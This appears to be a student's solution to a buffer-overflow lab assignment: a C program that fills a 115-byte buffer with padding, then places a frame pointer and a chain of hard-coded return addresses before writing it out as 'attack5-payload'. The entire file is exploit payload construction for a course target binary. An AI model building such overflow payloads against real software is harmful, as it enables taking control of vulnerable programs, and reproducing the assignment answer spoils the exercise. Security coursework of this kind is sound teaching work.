#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
	int buf_size=V5_SIZE+36; //79+36=115
	char buf[buf_size];
	memset(buf,'A',buf_size);
	buf[95]=0xc8;buf[96]=0xef;buf[97]=0xff;buf[98]=0xbf;
	buf[99]=0x9b;buf[100]=0x86;buf[101]=0x04;buf[102]=0x08;
	buf[103]=0xf6;buf[104]=0x86;buf[105]=0x04;buf[106]=0x08;
	buf[107]=0x51;buf[108]=0x87;buf[109]=0x04;buf[110]=0x08;
	buf[111]=0x7e;buf[112]=0x88;buf[113]=0x04;buf[114]=0x08;
    write_to_file( "attack5-payload", buf , buf_size, FILE_CLEAR );
    exit(0);
}
